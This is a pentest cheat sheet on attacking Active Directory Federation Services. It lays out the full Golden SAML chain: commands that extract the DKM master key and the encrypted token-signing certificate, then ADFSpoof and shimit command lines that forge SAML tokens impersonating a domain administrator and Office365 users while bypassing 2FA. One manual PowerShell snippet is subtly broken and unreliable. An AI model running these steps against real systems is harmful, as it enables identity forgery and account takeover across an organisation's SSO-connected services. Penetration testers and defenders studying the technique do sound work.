# Active Directory - Federation Services

Active Directory Federation Services (AD FS) is a software component developed by Microsoft that provides users with single sign-on (SSO) access to systems and applications located across organizational boundaries. It uses a claims-based access control authorization model to maintain application security and to provide seamless access to web-based applications that are hosted inside or outside the corporate network.


## ADFS - DKM Master Key

* The DKM key is stored in the `thumbnailPhoto` attribute of the AD contact object.

```ps1
$key=(Get-ADObject -filter 'ObjectClass -eq "Contact" -and name -ne "CryptoPolicy"' -SearchBase "CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=local" -Properties thumbnailPhoto).thumbnailPhoto
[System.BitConverter]::ToString($key)
```


## ADFS - Trust Relationship

Gets the relying party trusts of the Federation Service. 

* Search for `IssuanceAuthorizationRules`
    ```ps1
    Get-AdfsRelyingPartyTrust
    ```


## ADFS - Golden SAML

Golden SAML is a type of attack where an attacker creates a forged SAML (Security Assertion Markup Language) authentication response to impersonate a legitimate user and gain unauthorized access to a service provider. This attack leverages the trust established between the identity provider (IdP) and service provider (SP) in a SAML-based single sign-on (SSO) system. 

* Golden SAML are effective even when 2FA is enabled. 
* The token-signing private key is not renewed automatically
* Changing a user’s password won't affect the generated SAML


**Requirements**:

* ADFS service account
* The private key (PFX with the decryption password)

**Exploitation**:

* Run [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) on ADFS server as the **ADFS service account**. It will query the Windows Internal Database (WID): `\\.\pipe\MICROSOFT##WID\tsql\query`
* Convert PFX and Private Key to binary format
    ```ps1
    # For the pfx
    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
    # For the private key
    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
    ```

* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof), you might need to update the [dependencies](https://github.com/szymex73/ADFSpoof).
    ```ps1
    mkdir ADFSpoofTools
    cd $_
    git clone https://github.com/dmb2168/cryptography.git
    git clone https://github.com/mandiant/ADFSpoof.git 
    virtualenv3 venvADFSSpoof
    source venvADFSSpoof/bin/activate
    pip install lxml
    pip install signxml
    pip uninstall -y cryptography
    cd cryptography
    pip install -e .
    cd ../ADFSpoof
    pip install -r requirements.txt
    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
    ```


**Manual Exploitation**: 

* Retrieve the WID path: `Get-AdfsProperties`
* Retrieve the ADFS Relying Party Trusts: `Get-AdfsRelyingPartyTrust`
* Retrieve the signing certificate, save the `EncryptedPfx` and decode it `base64 -d adfs.b64 > adfs.bin`
    ```powershell
    $cmd.CommandText = "SELECT ServiceSettingsData from AdfsConfigurationV3.IdentityServerPolicy.ServiceSettings"
    $client= New-Object System.Data.SQLClient.SQLConnection($ConnectionString);
    $client.Open();
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT name FROM sys.databases"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $name = $reader.GetString(0)
    $reader.Close()
    Write-Output $name;
    ```
* Retrieve the DKM key stored inside the `thumbnailPhoto` attribute of the Active Directory: 
    ```ps1
    ldapsearch -x -H ldap://DC.domain.local -b "CN=ADFS,CN=Microsoft,CN=Program Data,DC=DOMAIN,DC=LOCAL" -D "adfs-svc-account@domain.local" -W -s sub "(&(objectClass=contact)(!(name=CryptoPolicy)))" thumbnailPhoto
    ```
* Convert the retrieved key to raw format: `echo "RETRIEVED_KEY_HERE" | base64 -d > adfs.key`
* Use [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof) to generate the Golden SAML

NOTE: There might be multiple master keys in the container, remember to try them all.


**Golden SAML Examples**

* SAML2: requires `--endpoint`, `--nameidformat`, `--identifier`, `--nameid` and `--assertions` 
    ```ps1
    python ADFSpoof.py -b adfs.bin adfs.key -s adfs.domain.local saml2 --endpoint https://www.contoso.com/adfs/ls
    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
    ```

* Office365: requires `--upn` and `--objectguid`
    ```ps1
    python3 ADFSpoof.py -b adfs.bin adfs.key -s sts.domain.local o365 --upn user@domain.local --objectguid 712D7BFAE0EB79842D878B8EEEE239D1
    ```

* Other: connect to the service provider using a known account, analyze the SAML token attributes given and reuse their format.

**NOTE**: Sync the time between the attacker's machine generating the Golden SAML and the ADFS server.


Other interesting tools to exploit AD FS: 

* [secureworks/whiskeysamlandfriends/WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml) - Proof of concept for a Golden SAML attack with Remote ADFS Configuration Extraction.
* [cyberark/shimit](https://github.com/cyberark/shimit) - A tool that implements the Golden SAML attack
    ```ps1
    python ./shimit.py -idp http://adfs.domain.local/adfs/services/trust -pk key -c cert.pem -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id REDACTED
    ```

## References

* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)
* [Active Directory Federation Services (ADFS) Distributed Key Manager (DKM) Keys - Threat Hunter Playbook](https://threathunterplaybook.com/library/windows/adfs_dkm_keys.html)
* [Exploring the Golden SAML Attack Against ADFS - 7 December 2021](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)
* [Golden SAML: Newly Discovered Attack Technique Forges Authentication to Cloud Apps - Shaked Reiner - 11/21/17](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)
* [Meet Silver SAML: Golden SAML in the Cloud - Tomer Nahum and Eric Woodruff - Feb 29, 2024](https://www.semperis.com/blog/meet-silver-saml/)